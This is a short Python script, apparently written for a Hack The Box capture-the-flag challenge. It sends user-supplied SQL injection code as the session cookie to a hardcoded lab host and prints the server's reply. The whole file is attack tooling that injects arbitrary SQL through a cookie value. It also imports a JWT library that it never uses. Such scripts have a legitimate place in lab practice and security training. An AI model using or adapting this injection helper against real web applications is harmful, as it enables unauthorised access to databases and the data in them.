import requests
import argparse
import jwt

# Argparser
parser = argparse.ArgumentParser()
parser.add_argument('-c', '--command', metavar='COMMAND', type=str,
					required=True, dest='command', help='SQL code for injection')
args = parser.parse_args()
command = args.command

# Generate URL for request
site='http://docker.hackthebox.eu:'
port='31930'
action='/'
url=site+port+action

# Send request
cookie={'session':command}
response=requests.get(url, cookies=cookie)
print(response.text)